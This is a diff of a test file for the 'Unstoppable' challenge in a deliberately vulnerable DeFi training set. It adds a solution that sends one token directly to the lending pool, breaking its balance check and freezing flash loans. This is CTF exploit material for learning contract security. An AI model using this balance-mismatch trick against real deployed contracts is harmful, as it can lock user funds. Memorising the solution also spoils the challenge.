@@ -4,6 +4,7 @@ const { accounts, contract } = require('@openzeppelin/test-environment');
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const UnstoppableLender = contract.fromArtifact('UnstoppableLender');
 const ReceiverContract = contract.fromArtifact('ReceiverUnstoppable');
+const UnstoppableExploit = contract.fromArtifact('UnstoppableExploit');
 
 const { expect } = require('chai');
 
@@ -39,7 +40,9 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        // Send a token outside of the `depositTokens` function so poolBalance
+        // doesn't get updated and `assert(poolBalance == balanceBefore);` fails.
+        await this.token.transfer(this.pool.address, 1, { from: attacker } );
     });
 
     after(async function () {
